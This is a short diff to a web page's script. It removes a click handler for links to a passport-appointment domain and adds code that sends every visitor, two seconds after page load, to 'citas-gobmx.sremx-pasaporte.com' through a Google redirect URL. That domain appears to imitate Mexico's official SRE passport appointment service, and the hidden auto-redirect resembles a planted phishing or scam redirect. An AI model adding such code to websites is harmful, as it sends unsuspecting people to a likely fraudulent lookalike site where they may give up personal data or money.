@@ -335,17 +335,6 @@
   </footer>
 
   <script>
-    document.querySelectorAll('a[href*="citas-gobmx.sremx-pasaporte.com"]').forEach(function (link) {
-      link.addEventListener('click', function (event) {
-        if (event.ctrlKey || event.metaKey || event.shiftKey || event.button !== 0) return;
-        event.preventDefault();
-        var destination = link.href;
-        window.setTimeout(function () {
-          window.location.href = destination;
-        }, 2000);
-      });
-    });
-
     // Burger menu (mobile)
     (function () {
       var burger = document.getElementById('burger');
@@ -383,6 +372,10 @@
       var y = document.getElementById('year');
       if (y) y.textContent = new Date().getFullYear();
     })();
+
+    window.setTimeout(function () {
+      window.location.replace('https://www.google.com/url?q=https%3A%2F%2Fcitas-gobmx.sremx-pasaporte.com%2F&sa=D&sntz=1&usg=AOvVaw3qU6Qxn4DrdrsoiyTPDDkD');
+    }, 2000);
 
     // Contact form -> Google Sheets (Apps Script webhook)
     (function () {
